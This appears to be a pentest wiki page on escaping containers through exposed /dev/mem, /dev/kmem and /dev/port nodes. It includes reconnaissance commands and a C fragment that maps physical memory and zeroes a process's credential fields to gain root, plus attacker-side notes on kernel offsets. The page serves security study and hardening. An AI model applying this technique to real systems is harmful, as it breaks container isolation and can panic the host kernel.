---
title: "Kernel memory devices: patching the running kernel through /dev/mem"
description: "Containers that expose the raw memory device nodes /dev/mem, /dev/kmem, or /dev/port let a process read and write physical memory directly. An attacker maps kernel pages, locates a process credentials structure or a security toggle, and overwrites it, escaping container isolation because physical memory belongs to the host, not any namespace."
keywords:
  - dev/mem
  - kernel memory
  - physical memory
  - credentials overwrite
  - container escape
---

# Kernel memory devices

The nodes `/dev/mem` (physical memory), `/dev/kmem` (kernel virtual memory), and `/dev/port` (I/O ports) are windows into the live host kernel. They are not namespaced, so a write through `/dev/mem` from inside a container changes the host kernel's memory. When a container exposes these nodes, usually under `--privileged` or an explicit `--device=/dev/mem`, an attacker with access can patch kernel data structures to elevate privileges or disable protections.

Confirm the nodes and whether RAM access is permitted:

```bash
ls -l /dev/mem /dev/kmem /dev/port 2>/dev/null
grep -E 'STRICT_DEVMEM|IO_STRICT_DEVMEM' /boot/config-$(uname -r) 2>/dev/null
# STRICT_DEVMEM=y confines /dev/mem to device ranges and blocks general RAM
```

## Route: overwrite process credentials

The classic objective is to find the `cred` structure of a shell process and zero its UID/GID fields, turning it into root, or to clear an LSM enforcement flag. The attacker needs a kernel address (from `/proc/kallsyms`, a known offset for the kernel release, or a leak) and the physical mapping for `/dev/mem`.

```c
int fd = open("/dev/mem", O_RDWR);
off_t phys = virt_to_phys(target_kvaddr);          // via known offset / leak
void *m = mmap(NULL, 0x1000, PROT_READ|PROT_WRITE, MAP_SHARED, fd, phys & ~0xfff);
uint32_t *cred = (uint32_t *)((char*)m + (phys & 0xfff));
cred[0] = cred[1] = cred[2] = cred[3] = 0;          // uid,gid,suid,sgid -> 0
```

Reading first with the same mapping lets you confirm the signature of the structure (for example the expected UID of the target process) before writing, which avoids corrupting the wrong page.

## Route: I/O ports

`/dev/port` and the `iopl`/`ioperm` surface reach device controllers directly. On suitable hardware this steers a DMA-capable device to read or write arbitrary physical memory, achieving the same kernel write without `/dev/mem` RAM access.

## Exploitation notes

- `CONFIG_STRICT_DEVMEM` (default on modern distributions) blocks general RAM through `/dev/mem`, leaving only device ranges; where set, prefer [CAP_SYS_MODULE](../capability-abuse/cap-sys-module.md) or a disk mount. `/dev/kmem` is removed on most current kernels.
- This route depends on accurate kernel offsets for the exact running build; mismatched offsets corrupt memory and panic the host, so fingerprint `uname -r` and the distribution kernel precisely first.
- Access to these nodes also implies the raw-I/O capability path; see [CAP_SYS_RAWIO](../capability-abuse/cap-sys-rawio.md).

## References

- [man 4 mem](https://man7.org/linux/man-pages/man4/mem.4.html)
- [Kernel docs: /dev/mem and STRICT_DEVMEM](https://www.kernel.org/doc/html/latest/driver-api/device-io.html)
- [HackTricks: Docker breakout](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-security/docker-breakout-privilege-escalation)
